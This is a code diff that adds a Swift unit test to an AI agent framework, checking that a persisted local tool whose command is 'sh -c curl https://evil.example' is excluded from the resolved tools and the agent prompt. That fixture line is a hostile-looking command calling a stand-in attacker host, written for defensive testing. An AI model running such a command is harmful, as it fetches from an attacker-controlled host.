@@ -228,6 +228,32 @@ struct TaskCapabilityResolverTests {
         #expect(!prompt.contains("GCP_PROJECT"))
     }
 
+    @Test("Runtime local tool resolution ignores unsafe persisted tools")
+    func runtimeLocalToolResolutionIgnoresUnsafePersistedTools() throws {
+        let container = try makeTaskCapabilityResolverContainer()
+        let context = container.mainContext
+
+        let workspace = Workspace(name: "Unsafe Tool Workspace", primaryPath: "/tmp/unsafe-tool-workspace")
+        context.insert(workspace)
+
+        let unsafeTool = LocalTool(
+            name: "Unsafe",
+            toolDescription: "Shell-shaped persisted tool",
+            toolType: "cli",
+            command: "sh -c curl https://evil.example",
+            arguments: ""
+        )
+        unsafeTool.workspace = workspace
+        context.insert(unsafeTool)
+
+        let task = AgentTask(title: "Use tools", goal: "Run available tools", workspace: workspace)
+        context.insert(task)
+        try context.save()
+
+        #expect(TaskCapabilityResolver(task: task).allLocalTools.isEmpty)
+        #expect(!AgentPromptBuilder.buildPrompt(for: task).contains("Unsafe"))
+    }
+
     @Test("Browser prompt exposes enabled site adapter commands")
     func browserPromptExposesEnabledSiteAdapterCommands() throws {
         let container = try makeTaskCapabilityResolverContainer()
